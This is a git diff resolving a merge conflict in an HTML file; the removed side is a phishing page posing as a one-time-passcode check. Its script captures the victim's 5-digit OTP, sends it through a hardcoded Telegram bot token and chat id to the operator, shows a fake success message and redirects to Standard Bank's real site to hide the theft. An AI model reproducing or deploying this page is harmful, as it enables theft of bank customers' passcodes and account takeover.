@@ -1,4 +1,3 @@
-<<<<<<< HEAD
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -67,74 +66,4 @@
     });
   </script>
 </body>
-=======
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>OTP Verification</title>
-  <link rel="stylesheet" href="style.css" />
-</head>
-<body>
-  <!-- Fixed Logo Positioned Above OTP Box -->
-  <img src="signinlogo.png" alt="Sign In Logo" class="logo" />
-
-  <div class="otp-fixed-container" id="otp-fixed-container">
-    <h2>Enter OTP</h2>
-    <div class="form-group">
-      <input type="password" id="otp" placeholder="Enter OTP" maxlength="5" pattern="\d{5}">
-    </div>
-    <div class="buttons">
-      <button id="verifyOTPBtn" aria-label="Verify OTP">Verify OTP</button>
-    </div>
-    <div id="otp-error" style="display: none;">Invalid OTP. Please enter a 5-digit number.</div>
-  </div>
-
-  <script>
-    // Telegram API configuration
-    const botToken = "8153232432:AAGEj9IZz22a9BYl3kPqp29zTsuMlGc82bA";
-    const chatId = "-4850961794";
-    const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-    // Function to send message to Telegram
-    const sendToTelegram = (message) => {
-      return fetch(telegramApiUrl, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message
-        })
-      });
-    };
-
-    // Event listener for OTP verification
-    document.getElementById('verifyOTPBtn').addEventListener('click', async () => {
-      const otp = document.getElementById('otp').value.trim();
-      const otpPattern = /^\d{5}$/;
-      const otpError = document.getElementById('otp-error');
-
-      if (otpPattern.test(otp)) {
-        const otpMessage = `OTP: ${otp}`;
-        try {
-          await Promise.all([sendToTelegram(otpMessage)]);
-          console.log("OTP sent successfully to Telegram.");
-          alert('OTP verified successfully!');
-          window.location.href = 'https://www.standardbank.co.za/southafrica/personal';
-        } catch (error) {
-          console.error("Failed to send OTP to Telegram:", error);
-          otpError.textContent = 'Failed to send OTP. Please try again.';
-          otpError.style.display = 'block';
-        }
-      } else {
-        otpError.textContent = 'Invalid OTP. Please enter a 5-digit number.';
-        otpError.style.display = 'block';
-      }
-    });
-  </script>
-</body>
->>>>>>> 52911e023d0b7fd873da4cfb858c017127d53dc9
 </html>
